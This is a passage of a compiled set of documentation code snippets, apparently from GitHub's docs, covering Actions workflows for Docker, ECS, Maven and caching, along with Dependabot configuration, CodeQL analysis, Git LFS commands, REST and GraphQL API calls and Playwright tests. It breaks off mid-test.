docker/metadata-action@9ec57ed1fcdbf14dcef7dfbe97b2010124a938b7\n        with:\n          images: my-docker-hub-namespace/my-docker-hub-repository\n\n      - name: Build and push Docker image\n        id: push\n        uses: docker/build-push-action@3b5e8027fcad23fda98b2e3ac259d8d67585f671\n        with:\n          context: .\n          file: ./Dockerfile\n          push: true\n          tags: {% raw %}${{ steps.meta.outputs.tags }}{% endraw %}\n          labels: {% raw %}${{ steps.meta.outputs.labels }}{% endraw %}\n\n{% ifversion artifact-attestations %}\n      - name: Generate artifact attestation\n        uses: actions/attest-build-provenance@v2\n        with:\n          subject-name: index.docker.io/my-docker-hub-namespace/my-docker-hub-repository\n          subject-digest: {% raw %}${{ steps.push.outputs.digest }}{% endraw %}\n          push-to-registry: true\n{% endif -%}\n```\n\n----------------------------------------\n\nTITLE: Configuring Dependency Review Action Workflow with YAML\nDESCRIPTION: This snippet shows how to set up a GitHub Actions workflow to run the Dependency Review Action. It includes steps for checking out the repository and running the action, specifying the path to the configuration file, and optionally using an external repository token. The workflow is triggered on pull requests.\nSOURCE: https://github.com/github/docs/blob/main/content/code-security/supply-chain-security/understanding-your-software-supply-chain/configuring-the-dependency-review-action.md#_snippet_2\n\nLANGUAGE: yaml\nCODE:\n```\nname: 'Dependency Review'\non: [pull_request]\n\npermissions:\n contents: read\n\njobs:\n dependency-review:\n runs-on: {% ifversion ghes %}[self-hosted]{% else %}ubuntu-latest{% endif %}\n steps:\n - name: 'Checkout Repository'\n uses: {% data reusables.actions.action-checkout %}\n - name: Dependency Review\n uses: actions/dependency-review-action@v4\n with:\n # ([String]). Representing a path to a configuration file local to the repository or in an external repository.\n # Possible values: An absolute path to a local file or an external file.\n config-file: './.github/dependency-review-config.yml'\n # Optional alternative syntax for an external file: OWNER/REPOSITORY/FILENAME@BRANCH (uncomment if preferred)\n # config-file: 'github/octorepo/dependency-review-config.yml@main'\n\n # ([Token]) Use if your configuration file resides in a private external repository.\n # Possible values: Any GitHub token with read access to the private external repository.\n external-repo-token: 'ghp_123456789abcde'\n```\n\n----------------------------------------\n\nTITLE: Conditional Job Execution Based on Commit State\nDESCRIPTION: This YAML snippet demonstrates how to conditionally run a job based on the commit state using the `github.event.state` context. The `if_error_or_failure` job only runs if the commit state is `error` or `failure`.\nSOURCE: https://github.com/github/docs/blob/main/content/actions/writing-workflows/choosing-when-your-workflow-runs/events-that-trigger-workflows.md#_snippet_49\n\nLANGUAGE: YAML\nCODE:\n```\non:\n  status\njobs:\n  if_error_or_failure:\n    runs-on: ubuntu-latest\n    if: >-\n      github.event.state == 'error' ||\n      github.event.state == 'failure'\n    steps:\n      - env:\n          DESCRIPTION: {% raw %}${{ github.event.description }}{% endraw %}\n        run: |\n          echo The status is error or failed: $DESCRIPTION\n```\n\n----------------------------------------\n\nTITLE: Basic CodeQL Database Analysis\nDESCRIPTION: This example demonstrates how to analyze a CodeQL database and save the results as a SARIF file. It utilizes the `--sarif-category` flag to specify the language of the analyzed code, which is crucial when analyzing multiple databases for a single commit. Requires a CodeQL database at `/codeql-dbs/example-repo` and saves the output to `/temp/example-repo-js.sarif`.\nSOURCE: https://github.com/github/docs/blob/main/content/code-security/codeql-cli/getting-started-with-the-codeql-cli/analyzing-your-code-with-codeql-queries.md#_snippet_2\n\nLANGUAGE: Shell\nCODE:\n```\n$ codeql database analyze /codeql-dbs/example-repo \\\n    javascript-code-scanning.qls --sarif-category=javascript-typescript \\\n    --format={% ifversion fpt or ghec %}sarif-latest{% else %}sarifv2.1.0{% endif %} --output=/temp/example-repo-js.sarif\n```\n\n----------------------------------------\n\nTITLE: Create and Publish Docker Image Workflow (YAML)\nDESCRIPTION: This workflow builds, tests, and publishes a Docker image to GitHub Package Registry. It runs on every push to the `release` branch. The workflow first checks out the repository, installs npm, builds the app, uploads artifacts, runs tests, and finally builds and pushes the Docker image. This uses the GITHUB_TOKEN for authentication.\nSOURCE: https://github.com/github/docs/blob/main/content/packages/managing-github-packages-using-github-actions-workflows/publishing-and-installing-a-package-with-github-actions.md#_snippet_0\n\nLANGUAGE: YAML\nCODE:\n```\n#\nname: Create and publish a Docker image\n\n# Configures this workflow to run every time a change is pushed to the branch called `release`.\non:\n  push:\n    branches: ['release']\n\njobs:\n# This job checks out the repository contents, installs `npm`, uses npm and webpack to build the app, and uploads the built files as an artifact that can be downloaded later in the workflow.\n# It assumes that the built files are written to a directory called `public`.\n  run-npm-build:\n    runs-on: ubuntu-latest\n    steps:\n      - uses: {% data reusables.actions.action-checkout %}\n      - name: npm install and build webpack\n        run: |\n          npm install\n          npm run build\n      - uses: {% data reusables.actions.action-upload-artifact %}\n        with:\n          name: webpack artifacts\n          path: public/\n\n# This job uses `npm test` to test the code. `needs: run-npm-build` makes this job dependent on the `run-npm-build` job.\n  run-npm-test:\n    runs-on: ubuntu-latest\n    needs: run-npm-build\n    strategy:\n      matrix:\n        os: [ubuntu-latest]\n        node-version: [14.x, 16.x]\n    steps:\n      - uses: {% data reusables.actions.action-checkout %}\n      - name: Use Node.js {% raw %}${{ matrix.node-version }}{% endraw %}\n        uses: {% data reusables.actions.action-setup-node %}\n        with:\n          node-version: {% raw %}${{ matrix.node-version }}{% endraw %}\n      - uses: {% data reusables.actions.action-download-artifact %}\n        with:\n          name: webpack artifacts\n          path: public\n      - name: npm install, and test\n        run: |\n          npm install\n          npm test\n        env:\n          CI: true\n```\n\n----------------------------------------\n\nTITLE: Tagging a Docker Image\nDESCRIPTION: This command tags a Docker image with a new name and hosting destination.  `IMAGE_NAME` should be the image ID or name of the image. `NAMESPACE` should be your user account or organization.  `NEW_IMAGE_NAME` is the desired name and `TAG` is the tag (e.g. latest).  This is necessary to push the image to the GitHub Container Registry.\nSOURCE: https://github.com/github/docs/blob/main/content/packages/learn-github-packages/connecting-a-repository-to-a-package.md#_snippet_4\n\nLANGUAGE: shell\nCODE:\n```\ndocker tag IMAGE_NAME {% data reusables.package_registry.container-registry-hostname %}/NAMESPACE/NEW_IMAGE_NAME:TAG\n```\n\n----------------------------------------\n\nTITLE: Initializing Git LFS (All OS)\nDESCRIPTION: This command initializes Git LFS in the current Git repository or globally, depending on how it's configured.  It ensures that Git LFS is properly set up to manage large files. A successful initialization is indicated by the output message.\nSOURCE: https://github.com/github/docs/blob/main/content/repositories/working-with-files/managing-large-files/installing-git-large-file-storage.md#_snippet_2\n\nLANGUAGE: Shell\nCODE:\n```\n$ git {% data variables.large_files.command_name %} install\n> {% data variables.large_files.product_name_short %} initialized.\n```\n\n----------------------------------------\n\nTITLE: Authenticating with Bearer Token using Curl\nDESCRIPTION: This snippet demonstrates how to authenticate a request to the GitHub REST API using a bearer token in the `Authorization` header. Replace `YOUR-TOKEN` with your actual token. It also includes the `X-GitHub-Api-Version` header, which specifies the desired API version.\nSOURCE: https://github.com/github/docs/blob/main/content/rest/authentication/authenticating-to-the-rest-api.md#_snippet_0\n\nLANGUAGE: Shell\nCODE:\n```\ncurl --request GET \\\n--url \"{% data variables.product.rest_url %}/octocat\" \\\n--header \"Authorization: Bearer YOUR-TOKEN\" \\\n--header \"X-GitHub-Api-Version: {{ allVersions[currentVersion].latestApiVersion }}\"\n```\n\n----------------------------------------\n\nTITLE: GitHub Actions Workflow with GitHub App Token\nDESCRIPTION: This workflow demonstrates how to generate and use a GitHub App installation access token within a GitHub Actions workflow. It checks out the repository content, sets up Node.js, installs Octokit, generates a token using the `actions/create-github-app-token` action, and executes a JavaScript script using this token.\nSOURCE: https://github.com/github/docs/blob/main/content/rest/quickstart.md#_snippet_7\n\nLANGUAGE: yaml\nCODE:\n```\non:\n  workflow_dispatch:\njobs:\n  use_api_via_script:\n    runs-on: ubuntu-latest\n    steps:\n      - name: Check out repo content\n        uses: {% data reusables.actions.action-checkout %}\n\n      - name: Setup Node\n        uses: {% data reusables.actions.action-setup-node %}\n        with:\n          node-version: '16.17.0'\n          cache: npm\n\n      - name: Install dependencies\n        run: npm install octokit\n\n      - name: Generate token\n        id: generate-token\n        uses: actions/create-github-app-token@v1\n        with:\n          app-id: {% raw %}${{ vars.APP_ID }}{% endraw %}\n          private-key: {% raw %}${{ secrets.APP_PEM }}{% endraw %}\n\n      - name: Run script\n        run: |\n          node .github/actions-scripts/use-the-api.mjs\n        env:\n          TOKEN: {% raw %}${{ steps.generate-token.outputs.token }}{% endraw %}\n\n   \n```\n\n----------------------------------------\n\nTITLE: Creating and Checking Out a New Branch Using Git\nDESCRIPTION: This snippet demonstrates how to create a new branch and switch to it using Git. This is a best practice for isolating changes and contributing to a project.  Requires Git to be installed.\nSOURCE: https://github.com/github/docs/blob/main/content/get-started/exploring-projects-on-github/contributing-to-a-project.md#_snippet_2\n\nLANGUAGE: shell\nCODE:\n```\ngit branch BRANCH-NAME\ngit checkout BRANCH-NAME\n```\n\n----------------------------------------\n\nTITLE: npmrc file configuration\nDESCRIPTION: This snippet shows the configuration of the `.npmrc` file that is created by the `setup-node` action.  It includes the authentication token and registry URL for npm.\nSOURCE: https://github.com/github/docs/blob/main/content/actions/use-cases-and-examples/publishing-packages/publishing-nodejs-packages.md#_snippet_1\n\nLANGUAGE: shell\nCODE:\n```\n//registry.npmjs.org/:_authToken=${NODE_AUTH_TOKEN}\nregistry=https://registry.npmjs.org/\nalways-auth=true\n```\n\n----------------------------------------\n\nTITLE: Deploy to Amazon ECS - GitHub Actions Workflow\nDESCRIPTION: This workflow defines a GitHub Actions pipeline to build, tag, and push a Docker image to Amazon ECR, update an ECS task definition with the new image, and deploy the updated task definition to Amazon ECS. It requires several environment variables to be set, including AWS region, ECR repository name, ECS service name, ECS cluster name, ECS task definition file path, and the container name within the task definition. It uses several AWS Actions, including `configure-aws-credentials`, `amazon-ecr-login`, `amazon-ecs-render-task-definition`, and `amazon-ecs-deploy-task-definition`.\nSOURCE: https://github.com/github/docs/blob/main/content/actions/use-cases-and-examples/deploying/deploying-to-amazon-elastic-container-service.md#_snippet_2\n\nLANGUAGE: yaml\nCODE:\n```\nname: Deploy to Amazon ECS\n\non:\n  push:\n    branches:\n      - main\n\nenv:\n  AWS_REGION: MY_AWS_REGION                   # set this to your preferred AWS region, e.g. us-west-1\n  ECR_REPOSITORY: MY_ECR_REPOSITORY           # set this to your Amazon ECR repository name\n  ECS_SERVICE: MY_ECS_SERVICE                 # set this to your Amazon ECS service name\n  ECS_CLUSTER: MY_ECS_CLUSTER                 # set this to your Amazon ECS cluster name\n  ECS_TASK_DEFINITION: MY_ECS_TASK_DEFINITION # set this to the path to your Amazon ECS task definition\n                                               # file, e.g. .aws/task-definition.json\n  CONTAINER_NAME: MY_CONTAINER_NAME           # set this to the name of the container in the\n                                               # containerDefinitions section of your task definition\n\njobs:\n  deploy:\n    name: Deploy\n    runs-on: ubuntu-latest\n    environment: production\n\n    steps:\n      - name: Checkout\n        uses: {% data reusables.actions.action-checkout %}\n\n      - name: Configure AWS credentials\n        uses: aws-actions/configure-aws-credentials@0e613a0980cbf65ed5b322eb7a1e075d28913a83\n        with:\n          aws-access-key-id: ${{ secrets.AWS_ACCESS_KEY_ID }}\n          aws-secret-access-key: ${{ secrets.AWS_SECRET_ACCESS_KEY }}\n          aws-region: ${{ env.AWS_REGION }}\n\n      - name: Login to Amazon ECR\n        id: login-ecr\n        uses: aws-actions/amazon-ecr-login@62f4f872db3836360b72999f4b87f1ff13310f3a\n\n      - name: Build, tag, and push image to Amazon ECR\n        id: build-image\n        env:\n          ECR_REGISTRY: ${{ steps.login-ecr.outputs.registry }}\n          IMAGE_TAG: ${{ github.sha }}\n        run: |\n          # Build a docker container and\n          # push it to ECR so that it can\n          # be deployed to ECS.\n          docker build -t $ECR_REGISTRY/$ECR_REPOSITORY:$IMAGE_TAG .\n          docker push $ECR_REGISTRY/$ECR_REPOSITORY:$IMAGE_TAG\n          echo \"image=$ECR_REGISTRY/$ECR_REPOSITORY:$IMAGE_TAG\" >> $GITHUB_OUTPUT\n\n      - name: Fill in the new image ID in the Amazon ECS task definition\n        id: task-def\n        uses: aws-actions/amazon-ecs-render-task-definition@c804dfbdd57f713b6c079302a4c01db7017a36fc\n        with:\n          task-definition: ${{ env.ECS_TASK_DEFINITION }}\n          container-name: ${{ env.CONTAINER_NAME }}\n          image: ${{ steps.build-image.outputs.image }}\n\n      - name: Deploy Amazon ECS task definition\n        uses: aws-actions/amazon-ecs-deploy-task-definition@df9643053eda01f169e64a0e60233aacca83799a\n        with:\n          task-definition: ${{ steps.task-def.outputs.task-definition }}\n          service: ${{ env.ECS_SERVICE }}\n          cluster: ${{ env.ECS_CLUSTER }}\n          wait-for-service-stability: true\n```\n\n----------------------------------------\n\nTITLE: Running Maven Verify Phase\nDESCRIPTION: This snippet shows how to configure a workflow to run the Maven `verify` phase. It checks out the repository, sets up the Java environment, and then executes `mvn --batch-mode --update-snapshots verify`. The `--batch-mode` option ensures Maven runs non-interactively, and `--update-snapshots` forces the updating of snapshot dependencies.\nSOURCE: https://github.com/github/docs/blob/main/content/actions/use-cases-and-examples/building-and-testing/building-and-testing-java-with-maven.md#_snippet_1\n\nLANGUAGE: YAML\nCODE:\n```\nsteps:\n  - uses: {% data reusables.actions.action-checkout %}\n  - uses: {% data reusables.actions.action-setup-java %}\n    with:\n      java-version: '17'\n      distribution: 'temurin'\n  - name: Run the Maven verify phase\n    run: mvn --batch-mode --update-snapshots verify\n```\n\n----------------------------------------\n\nTITLE: Masking a string in Bash\nDESCRIPTION: This snippet demonstrates how to mask a specific string in the workflow log using the `add-mask` command in Bash. Masked values are replaced with asterisks.\nSOURCE: https://github.com/github/docs/blob/main/content/actions/writing-workflows/choosing-what-your-workflow-does/workflow-commands-for-github-actions.md#_snippet_15\n\nLANGUAGE: bash\nCODE:\n```\necho \"::add-mask::Mona The Octocat\"\n```\n\n----------------------------------------\n\nTITLE: Building From Upstream: GitHub Actions Workflow (YAML)\nDESCRIPTION: Configures a GitHub Actions workflow to define dependencies between jobs. `job2` depends on `job1`, and `job3` depends on both `job1` and `job2`.\nSOURCE: https://github.com/github/docs/blob/main/content/actions/migrating-to-github-actions/manually-migrating-to-github-actions/migrating-from-jenkins-to-github-actions.md#_snippet_5\n\nLANGUAGE: YAML\nCODE:\n```\njobs:\n  job1:\n  job2:\n    needs: job1\n  job3:\n    needs: [job1, job2]\n```\n\n----------------------------------------\n\nTITLE: Configuring Dependabot Version Updates with YAML\nDESCRIPTION: This YAML snippet provides a basic `dependabot.yml` configuration file. It defines the version, updates, package ecosystem, directory, and schedule for Dependabot version updates. Users need to adapt the `package-ecosystem` and `directory` according to their project's needs.\nSOURCE: https://github.com/github/docs/blob/main/content/code-security/dependabot/dependabot-version-updates/configuring-dependabot-version-updates.md#_snippet_0\n\nLANGUAGE: yaml\nCODE:\n```\n# To get started with Dependabot version updates, you'll need to specify which\n# package ecosystems to update and where the package manifests are located.\n\nversion: 2\nupdates:\n- package-ecosystem: \"\" # See documentation for possible values\n  directory: \"/\" # Location of package manifests\n  schedule:\n    interval: \"weekly\"\n```\n\n----------------------------------------\n\nTITLE: Full Example Script using Octokit\nDESCRIPTION: This snippet presents a full example script that uses Octokit.rb to get changed files for a pull request and add a comment if any data files have been modified. It includes functions for getting changed files and commenting on the pull request.\nSOURCE: https://github.com/github/docs/blob/main/content/rest/guides/scripting-with-the-rest-api-and-ruby.md#_snippet_17\n\nLANGUAGE: ruby\nCODE:\n```\nrequire \"octokit\"\n\n octokit = Octokit::Client.new(access_token: \"YOUR-TOKEN\")\n\n def get_changed_files(octokit, owner, repo, pull_number)\n files_changed = []\n\n begin\n iterator = octokit.paginate.iterator(\"GET /repos/{owner}/{repo}/pulls/{pull_number}/files\", owner: owner, repo: repo, pull_number: pull_number, per_page: 100)\n iterator.each do | data |\n     files_changed.concat(data.map {\n       | file_data | file_data.filename\n     })\n   end\n rescue Octokit::Error => error\n if error.response\n puts \"Error! Status: #{error.response.status}. Message: #{error.response.data.message}\"\n end\n puts error\n end\n\n files_changed\n end\n\n def comment_if_data_files_changed(octokit, owner, repo, pull_number)\n changed_files = get_changed_files(octokit, owner, repo, pull_number)\n\n if changed_files.any ? {\n   | file_name | /\\/data\\//i.match ? (file_name)\n }\n begin\n comment = octokit.create_pull_request_review_comment(owner, repo, pull_number, \"It looks like you changed a data file. These files are auto-generated. \\n\\nYou must revert any changes to data files before your pull request will be reviewed.\")\n comment.html_url\n rescue Octokit::Error => error\n if error.response\n puts \"Error! Status: #{error.response.status}. Message: #{error.response.data.message}\"\n end\n puts error\n end\n end\n end\n\n# Example usage\nowner = \"github\"\nrepo = \"docs\"\npull_number = 22809\ncomment_url = comment_if_data_files_changed(octokit, owner, repo, pull_number)\n\nputs \"A comment was added to the pull request: #{comment_url}\"\n```\n\n----------------------------------------\n\nTITLE: Querying GraphQL Schema for all Types\nDESCRIPTION: This GraphQL query retrieves a list of all types defined in the GraphQL schema.  It fetches the name, kind, description, and fields for each type. This is useful for understanding the available data and structure of the API.\nSOURCE: https://github.com/github/docs/blob/main/content/graphql/guides/introduction-to-graphql.md#_snippet_1\n\nLANGUAGE: GraphQL\nCODE:\n```\nquery {\n  __schema {\n    types {\n      name\n      kind\n      description\n      fields {\n        name\n      }\n    }\n  }\n}\n```\n\n----------------------------------------\n\nTITLE: Conditional Job Execution based on Branch - YAML\nDESCRIPTION: This YAML snippet demonstrates how to use the `github.ref` context to conditionally execute a job based on the branch name. The `if` statement checks if the current branch is 'refs/heads/main'. If true, the job proceeds; otherwise, it's skipped. The snippet also shows accessing the `$GITHUB_REF` environment variable within a step.\nSOURCE: https://github.com/github/docs/blob/main/content/actions/writing-workflows/choosing-what-your-workflow-does/accessing-contextual-information-about-workflow-runs.md#_snippet_0\n\nLANGUAGE: yaml\nCODE:\n```\nname: CI\non: push\njobs:\n  prod-check:\n    if: ${{ github.ref == 'refs/heads/main' }}\n    runs-on: ubuntu-latest\n    steps:\n      - run: echo \"Deploying to production server on branch $GITHUB_REF\"\n```\n\n----------------------------------------\n\nTITLE: Run job based on head branch of pull request\nDESCRIPTION: This workflow triggers when a pull request is opened, but the `run_if` job only executes if the head of the pull request is a branch whose name starts with `releases/`. It showcases using `github.head_ref` in a conditional.\nSOURCE: https://github.com/github/docs/blob/main/content/actions/writing-workflows/choosing-when-your-workflow-runs/events-that-trigger-workflows.md#_snippet_32\n\nLANGUAGE: yaml\nCODE:\n```\non:\n  pull_request_target:\n    types:\n      - opened\njobs:\n  run_if:\n    if: startsWith(github.head_ref, 'releases/')\n    runs-on: ubuntu-latest\n    steps:\n      - run: echo \"The head of this PR starts with 'releases/'\"\n```\n\n----------------------------------------\n\nTITLE: Mapping CI_PIPELINE_TRIGGERED to GitHub Actions variable\nDESCRIPTION: Maps the GitLab CI environment variable `CI_PIPELINE_TRIGGERED` to the GitHub Actions equivalent `${{ github.actions }}`. Check whether action is available.\nSOURCE: https://github.com/github/docs/blob/main/content/actions/migrating-to-github-actions/using-github-actions-importer-to-automate-migrations/migrating-from-gitlab-with-github-actions-importer.md#_snippet_34\n\nLANGUAGE: YAML\nCODE:\n```\n${{ github.actions }}\n```\n\n----------------------------------------\n\nTITLE: Caching Gradle Packages with GitHub Actions Cache\nDESCRIPTION: This YAML snippet demonstrates how to configure the `cache` action in a GitHub Actions workflow to cache Gradle packages.  It defines the `path` parameter to include both the Gradle caches directory and the Gradle wrapper directory, ensuring that both are cached for faster builds. The action uses the specified paths to store and retrieve cached dependencies.\nSOURCE: https://github.com/github/docs/blob/main/content/actions/writing-workflows/choosing-what-your-workflow-does/caching-dependencies-to-speed-up-workflows.md#_snippet_0\n\nLANGUAGE: yaml\nCODE:\n```\n    - name: Cache Gradle packages\n      uses: {% data reusables.actions.action-cache %}\n      with:\n        path: |\n          ~/.gradle/caches\n          ~/.gradle/wrapper\n```\n\n----------------------------------------\n\nTITLE: Configuring Gradle with username and password\nDESCRIPTION: This snippet shows how to configure Dependabot to authenticate with a Maven repository (used for Gradle) using a username and password in the `dependabot.yml` file.  The registry type, URL, username, and password (stored as a secret) are specified, along with update schedule configurations.\nSOURCE: https://github.com/github/docs/blob/main/content/code-security/dependabot/working-with-dependabot/guidance-for-the-configuration-of-private-registries-for-dependabot.md#_snippet_5\n\nLANGUAGE: yaml\nCODE:\n```\nregistries:\n  gradle-artifactory:\n    type: maven-repository\n    url: https://acme.jfrog.io/artifactory/my-gradle-registry\n    username: octocat\n    password: ${{secrets.MY_ARTIFACTORY_PASSWORD}}\nupdates:\n  - package-ecosystem: \"gradle\"\n    directory: \"/\"\n    registries:\n      - gradle-artifactory\n    schedule:\n      interval: \"monthly\"\n```\n\n----------------------------------------\n\nTITLE: Deploying Sigstore Policy Controller with Helm\nDESCRIPTION: This command deploys the Sigstore Policy Controller into the 'artifact-attestations' namespace using a Helm chart. It installs the controller, but initially no policies are configured, so no attestations are enforced. It uses the `helm upgrade` command with the `--install` and `--atomic` flags for safe and idempotent deployments.\nSOURCE: https://github.com/github/docs/blob/main/content/actions/security-for-github-actions/using-artifact-attestations/enforcing-artifact-attestations-with-a-kubernetes-admission-controller.md#_snippet_0\n\nLANGUAGE: bash\nCODE:\n```\nhelm upgrade policy-controller --install --atomic \\\n  --create-namespace --namespace artifact-attestations \\\n  oci://ghcr.io/github/artifact-attestations-helm-charts/policy-controller \\\n  --version v0.12.0-github12\n```\n\n----------------------------------------\n\nTITLE: Tracking file types with Git LFS in Shell\nDESCRIPTION: This snippet demonstrates how to associate a specific file type (e.g., *.psd) with Git LFS using the `git lfs track` command. This command updates the _.gitattributes_ file to track the specified file type. The user should replace \"*.psd\" with the actual file extension they want to track.\nSOURCE: https://github.com/github/docs/blob/main/content/repositories/working-with-files/managing-large-files/configuring-git-large-file-storage.md#_snippet_0\n\nLANGUAGE: shell\nCODE:\n```\n$ git {% data variables.large_files.command_name %} track \"*.psd\"\n> Tracking \"*.psd\"\n```\n\n----------------------------------------\n\nTITLE: Pushing container image with version tag - Docker CLI\nDESCRIPTION: This command pushes a container image tagged with a specific version (e.g., `2.5`) to the GitHub Container Registry. Replace `NAMESPACE` with the account or organization name, and `IMAGE_NAME` with the image's name. The command assumes that you have already built and tagged the image locally.\nSOURCE: https://github.com/github/docs/blob/main/content/packages/working-with-a-github-packages-registry/working-with-the-container-registry.md#_snippet_1\n\nLANGUAGE: shell\nCODE:\n```\ndocker push {% data reusables.package_registry.container-registry-hostname %}/NAMESPACE/IMAGE_NAME:2.5\n```\n\n----------------------------------------\n\nTITLE: Defining Restore Keys for npm Cache in GitHub Actions\nDESCRIPTION: This YAML snippet demonstrates how to define `restore-keys` for the `cache` action in a GitHub Actions workflow when caching npm dependencies. The `restore-keys` are used as fallback keys if an exact match for the primary `key` is not found, allowing for partial cache matches. The `hashFiles` function is utilized to create a key based on the `package-lock.json` file, while fallback keys provide broader matching capabilities.\nSOURCE: https://github.com/github/docs/blob/main/content/actions/writing-workflows/choosing-what-your-workflow-does/caching-dependencies-to-speed-up-workflows.md#_snippet_1\n\nLANGUAGE: yaml\nCODE:\n```\n  {% raw %}\n\n  ```yaml\n  restore-keys: |\n    npm-feature-${{ hashFiles('package-lock.json') }}\n    npm-feature-\n    npm-\n  ```\n\n  {% endraw %}\n```\n\n----------------------------------------\n\nTITLE: Running Commands with PowerShell Desktop (YAML)\nDESCRIPTION: This YAML snippet demonstrates how to run a command using PowerShell Desktop in a GitHub Actions workflow. It uses the `shell` keyword to explicitly specify `powershell` as the shell interpreter and shows the PowerShell syntax for accessing environment variables.\nSOURCE: https://github.com/github/docs/blob/main/content/actions/writing-workflows/workflow-syntax-for-github-actions.md#_snippet_23\n\nLANGUAGE: yaml\nCODE:\n```\nsteps:\n  - name: Display the path\n    shell: powershell\n    run: echo ${env:PATH}\n```\n\n----------------------------------------\n\nTITLE: cURL Command for REST API Authentication\nDESCRIPTION: This example demonstrates how to use the `curl` command to make a request to the GitHub REST API using an access token. It sets the `Authorization` header with a `Bearer` token. It retrieves issues from the specified repository and uses the `Accept` header to request the `application/vnd.github+json` media type.\nSOURCE: https://github.com/github/docs/blob/main/content/rest/quickstart.md#_snippet_8\n\nLANGUAGE: shell\nCODE:\n```\ncurl --request GET \\\n   --url \"{% data variables.product.rest_url %}{% data variables.rest.example_request_url %}\" \\\n   --header \"Accept: application/vnd.github+json\" \\\n   --header \"Authorization: Bearer YOUR-TOKEN\"\n```\n\n----------------------------------------\n\nTITLE: Customize Subject Claim: Specific Repository\nDESCRIPTION: This JSON template customizes the `sub` claim to include the `repo`. It grants cloud access to all workflows in a specific repository. The cloud provider OIDC configuration should require a `repo` claim matching the required value.\nSOURCE: https://github.com/github/docs/blob/main/content/actions/security-for-github-actions/security-hardening-your-deployments/about-security-hardening-with-openid-connect.md#_snippet_6\n\nLANGUAGE: json\nCODE:\n```\n{\n   \"include_claim_keys\": [\n       \"repo\"\n   ]\n}\n```\n\n----------------------------------------\n\nTITLE: Cloning a Repository with a PAT via HTTPS\nDESCRIPTION: This example demonstrates how to clone a Git repository using HTTPS and authenticating with a personal access token instead of a password. It showcases the command-line interaction, including the Git clone command and the subsequent prompts for username and password where the PAT is used.\nSOURCE: https://github.com/github/docs/blob/main/content/authentication/keeping-your-account-and-data-secure/managing-your-personal-access-tokens.md#_snippet_0\n\nLANGUAGE: shell\nCODE:\n```\n$ git clone https://{% data variables.product.product_url %}/USERNAME/REPO.git\nUsername: YOUR-USERNAME\nPassword: YOUR-PERSONAL-ACCESS-TOKEN\n```\n\n----------------------------------------\n\nTITLE: Generating GitHub App Token in GitHub Actions Workflow (YAML)\nDESCRIPTION: This YAML snippet demonstrates how to generate a GitHub App token within a GitHub Actions workflow using the `actions/create-github-app-token` action.  It retrieves the app ID from a configuration variable and the private key from a secret.  The generated token is then used to make an API request using the GitHub CLI.\nSOURCE: https://github.com/github/docs/blob/main/content/apps/creating-github-apps/authenticating-with-a-github-app/making-authenticated-api-requests-with-a-github-app-in-a-github-actions-workflow.md#_snippet_0\n\nLANGUAGE: yaml\nCODE:\n```\non:\n  workflow_dispatch:\njobs:\n  demo_app_authentication:\n    runs-on: ubuntu-latest\n    steps:\n      - name: Generate a token\n        id: generate-token\n        uses: actions/create-github-app-token@v1\n        with:\n          app-id: {% raw %}${{ vars.APP_ID }}{% endraw %}\n          private-key: {% raw %}${{ secrets.APP_PRIVATE_KEY }}{% endraw %}\n\n      - name: Use the token\n        env:\n          GH_TOKEN: {% raw %}${{ steps.generate-token.outputs.token }}{% endraw %}\n        run: |\n          gh api octocat\n```\n\n----------------------------------------\n\nTITLE: Running Workflow with Inputs via CLI\nDESCRIPTION: This shell command demonstrates how to run a GitHub Actions workflow using the `gh` CLI and provide input values. It uses the `-f` flag to pass values for the `logLevel`, `tags`, and `environment` inputs when triggering the `run-tests.yml` workflow.\nSOURCE: https://github.com/github/docs/blob/main/content/actions/writing-workflows/choosing-when-your-workflow-runs/events-that-trigger-workflows.md#_snippet_54\n\nLANGUAGE: Shell\nCODE:\n```\ngh workflow run run-tests.yml -f logLevel=warning -f tags=false -f environment=staging\n```\n\n----------------------------------------\n\nTITLE: Handling arguments and flags in bash\nDESCRIPTION: This bash script demonstrates how to handle arguments and flags passed to a `gh` extension. It parses flags like `--verbose`, `--name`, `-h`, and `--help` to modify the script's behavior. It shows how to use a `while` loop and `case` statement to process command-line arguments.\nSOURCE: https://github.com/github/docs/blob/main/content/github-cli/github-cli/creating-github-cli-extensions.md#_snippet_7\n\nLANGUAGE: Bash\nCODE:\n```\n#!/usr/bin/env bash\nset -e\n\nverbose=\"\"\nname_arg=\"\"\nwhile [ $# -gt 0 ]; do\n  case \"$1\" in\n  --verbose)\n    verbose=1\n    ;;\n  --name)\n    name_arg=\"$2\"\n    shift\n    ;;\n  -h|--help)\n    echo \"Add help text here.\"\n    exit 0\n    ;;\n  esac\n  shift\ndone\n\nif [ -z \"$name_arg\" ]\nthen\n  echo \"You haven't told us your name.\"\nelif [ -z \"$verbose\" ]\nthen\n  echo \"Hi $name_arg\"\nelse\n  echo \"Hello and welcome, $name_arg\"\nfi\n```\n\n----------------------------------------\n\nTITLE: Playwright End-to-End Tests\nDESCRIPTION: This TypeScript code defines end-to-end tests for the `ProductDetails` component using Playwright. It mocks API responses to simulate successful product retrieval and error scenarios. The tests verify the loading state, product details, and error messages displayed in the component. The tests use `page.route` to mock the API and `page.goto` to navigate to the product page.\nSOURCE: https://github.com/github/docs/blob/main/content/copilot/copilot-chat-cookbook/testing-code/create-end-to-end-tests-for-a-webpage.md#_snippet_1\n\nLANGUAGE: typescript\nCODE:\n```\nimport { test, expect } from '@playwright/test';\n\ntest.describe('ProductDetails Component', () => {\n  test.beforeEach(async ({ page }) => {\n    // Set up API mocking\n    await page.route('/api/product/1', async (route) => {\n      await route.fulfill({\n        status: 200,\n        contentType: 'application/json',\n        body: JSON.stringify({\n          name: 'Test Product',\n          description: 'This is a test product',\n          price: 99.99\n        })\n      });\n    });\n\n    // Mock error response for product ID 999\n    await page.route('/api/product/999', async (route) => {\n      await route.fulfill({\n        status: 404,\n        contentType: 'application/json',\n        body: JSON.stringify({ error: 'Product not found' })\n      });\n    });\n  });\n\n  test('displays loading state initially', async ({ page }) => {\n    await page.goto('/product/1');\n    const loadingElement = page.locator('text=Loading...');\n    await expect(loadingElement).toBeVisible();\n  });\n\n  test('displays product details correctly', async ({ page }) => {\n    await page.goto('/product/1');\n\n    // Wait for loading to disappear\n    await expect(page.getByText('Loading...')).toBeHidden();\n\n    // Check all product details\n    await expect(page.locator('h2')).toHaveText('Test Product');\n    await expect(page.locator('text=This is a test product')).toBeVisible();\n    await expect(page.locator('text=Price: $99.99')).toBeVisible();\n  });\n\n  test('displays error message when product not found', async ({ page }) => {\n    await page.goto('/product/999');\n\n    // Wait for loading to disappear\n    await expect(page.getByText('Loading...')).toBeHidden();\n\n    // Check error message\n    await 